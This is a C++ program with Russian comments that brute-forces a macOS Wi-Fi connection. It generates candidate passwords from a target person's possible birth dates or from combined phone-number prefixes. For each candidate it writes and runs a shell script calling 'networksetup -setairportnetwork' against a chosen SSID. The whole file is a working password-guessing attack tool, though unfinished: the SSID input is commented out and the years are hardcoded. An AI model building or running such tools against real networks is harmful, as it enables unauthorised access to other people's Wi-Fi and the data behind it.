#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <fstream>
#include <string>
#include <vector> 
#include <sstream>

using namespace std;
int main() {
    string SSID;
    string password;
    string str = "";

    int variant = 0;
    // Блок подбора пароля по дате
    cout << "Выберите способ подбора пароля" << endl;
    cout << "1) По дате рождения" << endl;
    cout << "2) По номерам телефонов" << endl;
    cin >> variant;
    //variant = 2;
    // начало даты и конец, котоыре указывает пользователь
    int start_year;
    int end_year;

    if (variant == 1)
    {
        cout << "В какой промежуток мог родиться человек? Введите первый год, начиная с 1960" << endl;
        //cin >> start_year;
        cout << "Введите окончательный год" << endl;
        //cin >> end_year;
        start_year = 2000;
        end_year = 2001;
        string line;
        vector<string> data_vector;
        ifstream myfile ("/Users/kirill/Documents/C++/Wifi/Data/calendar_data.txt");

        string temp_str = ""; // для преобразования int к str
        // Чтение файла с датами
        if (myfile.is_open())
        {
            while (!myfile.eof())
            {
                getline (myfile,line);
                for (int year = start_year; year < end_year + 1; year++)
                {
                    stringstream out;
                    out << year;
                    temp_str = out.str();
                    if (line.find(temp_str) != -1)
                    {
                        data_vector.push_back(line); // добавление в вектор подходящих дат
                        break;
                    }
                }
            }
            myfile.close();
        }
        else
        {
            cout << "Ошибка открытия файла\n";
        }

        cout << "Введите SSID" << endl;
        //cin >> SSID;
        string a = "test SSID";
        for (int i = 0; i < data_vector.size(); i++){
            cout << "Цикл\n";

            password = data_vector[i];

            cout << password << endl;

            ofstream fout;
            fout.open("/Users/kirill/Documents/C++/Wifi/start.sh");
            fout << "#!/usr/bin/env bash" << endl;
            fout << "networksetup -setairportnetwork en0 " << SSID << " " << password << "; echo \"\n\"" <<endl;
            fout.close();

            system("/Users/kirill/Documents/C++/Wifi/start.sh");

        }

    } // variant 1

if (variant == 2){

    string line;
    vector<string> number1_vector;
    vector<string> number2_vector;

    ifstream myfile("/Users/kirill/Documents/C++/Wifi/Data/phone_codes.txt"); // окрываем файл для чтения
    if (myfile.is_open())
    {
        while (getline(myfile, line))
        {
            //cout << line << endl;
            number1_vector.push_back(line); // добавление в вектор первых номеров
        }
    }
    myfile.close();     // закрываем файл
     
    cout << "Закрыт первый файл" << endl;

    ifstream fin("/Users/kirill/Documents/C++/Wifi/Data/next_phone_codes.txt"); // окрываем файл для чтения
    if (fin.is_open())
    {
        while (getline(fin, line))
        {
            //cout << line << endl; высокая нагрузка при выводе
            number2_vector.push_back(line); // добавление в вектор вторых номеров
        }
    }
    fin.close();     // закрываем файл
     
    cout << "Закрыт второй файл" << endl;


    cout << "Введите SSID" << endl;
    //cin >> SSID;
    string a = "";
    //cin >> password;
    for (int i = 0; i < number1_vector.size(); i++){
        cout << "Цикл по номерам\n";
        for (int j = 0; j < number2_vector.size(); j++){
            password = number1_vector[i] + number2_vector[j];

            cout << "Пароль " << password << endl;

            ofstream fout;
            fout.open("/Users/kirill/Documents/C++/Wifi/start.sh");
            fout << "#!/usr/bin/env bash" << endl;
            fout << "networksetup -setairportnetwork en0 " << SSID << " " << password << "; echo \"\n\"" <<endl;
            fout.close();

            system("/Users/kirill/Documents/C++/Wifi/start.sh");
        }
    }

} // variant 2


return 0;
}
